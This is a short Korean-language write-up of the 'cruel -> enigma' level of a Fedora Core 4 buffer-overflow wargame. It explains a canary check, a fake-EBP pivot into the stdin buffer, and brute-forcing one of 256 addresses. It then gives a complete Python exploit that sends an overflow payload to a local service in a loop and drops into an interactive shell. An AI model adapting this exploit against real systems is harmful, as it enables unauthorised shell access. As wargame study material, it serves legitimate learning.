---
title: FC4 cruel -> enigma
date: 2017-01-07 03:05:00 +0900 KST
categories: [write-up]
---

ret 영역 다음에 canary가 있다는 걸 생각하야 한다.

fake ebp를 이용해서 stdin의 임시버퍼 영역을 공략한다.

이 영역의 주소가 계속 바뀌긴 하지만 경우의 수가 겨우 256가지뿐이다.

특정한 주소로 공격하면 256분의 1의 확률로 공격에 성공할 수 있다.

난 execl을 호출해서 쉘을 따려고 했는데 계속 안됐다... execve는 되던데

아래는 익스플로잇 코드

```python
#!/usr/bin/python
from struct import pack
from socket import *
from time import sleep

p = lambda x : pack('<L', x)

fake_ebp  = 0xb7f5e000 + 260 + 4 * 2
leave_ret = 0x0804858e
canary    = 0x00031337
execve    = 0x00832abc
binsh     = 0x008bd987

null         = 0x00000000
null_ptr     = fake_ebp + 4 * 7
null_ptr_ptr = fake_ebp + 4 * 6

buffer = 'A' * 256
dummy  = 'A' * 4

payload  = buffer + dummy
payload += p(fake_ebp) + p(leave_ret) + p(canary)
payload += p(execve) + dummy + p(binsh) + p(null_ptr_ptr) + p(null_ptr_ptr)
payload += p(null_ptr) + p(null)
payload += '\n'

for i in xrange(1000):
    print i

    s = socket(AF_INET, SOCK_STREAM)
    s.connect(( 'localhost', 7777 ))
    s.recv(1024)
    s.send(payload)
    sleep(0.1)

    s.send('id\n')
    if s.recv(1024):
        while True:
            try:
                s.send(raw_input('$ ') + '\n')
            except EOFError:
                s.close()
                break
            print s.recv(1024)
        break
    s.close()
```
